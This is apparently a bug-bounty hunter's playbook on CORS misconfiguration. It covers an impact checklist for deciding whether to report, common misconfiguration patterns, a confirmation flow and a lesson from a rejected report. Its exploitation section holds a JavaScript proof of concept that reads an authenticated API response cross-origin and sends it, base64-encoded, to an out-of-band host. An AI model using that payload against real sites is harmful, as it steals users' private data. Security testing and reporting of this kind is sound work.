# CORS misconfiguration — playbook

---

## IMPACT GATE — run this BEFORE writing any CORS finding

Answer all four questions. ONE "NO" = do NOT write a finding. Kill the hypothesis.

**Q1 — Is the auth model cookie-based?**
- `SameSite=None` cookies present → YES, cookies are sent cross-origin → proceed
- `SameSite=Lax/Strict` cookies only → POST/non-nav requests won't carry them → check if the sensitive endpoint is GET
- Bearer/JWT in Authorization header only → NO ambient credential → CORS is a false positive (attacker can't inject the header cross-origin)

**Q2 — Does the actual response body contain HIGH-sensitivity data?**
HIGH (proceed): email, phone, postal address, password hash, session token, payment card data, booking/order details with financials, internal-only IDs that unlock further bugs.
LOW (STOP — do not report as standalone):
- Display name / username alone
- VIP status / tier
- Notification count
- Preferences / favorites / loyalty membership lists
- Any data that is visible to the user on the page anyway

If LOW → this is informational at best. Do not write a finding.

**Q3 — Do the affected write operations cause real harm?**
HIGH (proceed): account takeover, privilege escalation, financial loss, deletion of victim data, bypassing a security control.
LOW (STOP):
- Adding/removing favorites
- Enrolling in a loyalty program
- Changing display preferences
- Any action the victim could undo in one click with no real damage

If write operations are LOW-harm and reads are LOW-sensitivity → kill the finding.

**Q4 — Is the attack chain complete WITHOUT prerequisite bugs?**
- Arbitrary `Origin` reflected → attacker serves exploit from any origin → YES (no chain needed)
- `*.target.com` wildcard only → attacker must control a subdomain → only proceed if you have CONFIRMED a subdomain takeover or stored XSS on a sibling subdomain. "Could potentially" is not enough.

**All four must pass. Document your answers in the finding under "impact gate".**

---

## when to try
- Endpoints that return sensitive data and might reflect the `Origin` header.

## the concrete bug shapes
1. **Reflected origin + credentials**: server replies with
   `Access-Control-Allow-Origin: <your origin>` AND
   `Access-Control-Allow-Credentials: true` → any cross-origin site can read
   the user's authenticated response.
2. **Trusts subdomain wildcards**: `*.target.com` allowed → subdomain takeover or stored XSS on a sibling subdomain → game over.
3. **`null` origin allowed + credentials**: trigger `null` from a sandboxed iframe.
4. **Suffix/prefix match**: regex like `/^https:\/\/.*target\.com$/` → `attacker-target.com` matches.
5. **Pre-flight bypass**: simple requests (GET, POST x-www-form-urlencoded) skip preflight; if the endpoint is state-changing AND CORS-trusts your origin, you can read+write.

## confirmation flow
1. Send a request with `Origin: https://attacker.com`.
2. Look at response headers:
   - `Access-Control-Allow-Origin: https://attacker.com` ← reflected
   - `Access-Control-Allow-Credentials: true` ← credentialed
   Both present + sensitive body = high-impact.
3. PoC: serve a page from `attacker.com` that does `fetch('https://target/api/me', {credentials:'include'}).then(r=>r.text()).then(...)`.

## exploitation snippet
```bash
curl -sk -i -H 'Origin: https://attacker.com' https://t/api/me | grep -i 'access-control'
```

PoC:
```html
<script>
fetch('https://target/api/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://oob/?d='+btoa(t)));
</script>
```

## caveats
- A reflected `Origin` WITHOUT `Allow-Credentials: true` is usually acceptable risk (data is already public).
- Watch for `Vary: Origin` — without it the response gets cached and amplifies impact.
- **`*.target.com` wildcard ≠ automatic high severity.** It only matters if (a) you own or can take over a subdomain, or (b) XSS exists on a sibling subdomain. Without a real subdomain attack anchor the "wildcard reflection" is theoretical.
- **Write operations (favorites, loyalty, preferences) are not impact.** Impact = financial loss, account takeover, privilege gain, or real PII exfil. Cosmetic state changes = N/A at every major program.
- Agoda lesson (2026-06): submitted wildcard CORS across Cronos endpoints. Confirmed impact was display name + VIP status (read) and favorites/loyalty (write). All LOW-sensitivity. Triaged as N/A. Account flagged for low-quality report. Do not repeat.

## provenance
PortSwigger CORS labs. Common misconfig in Express + cors() with `origin: true`.
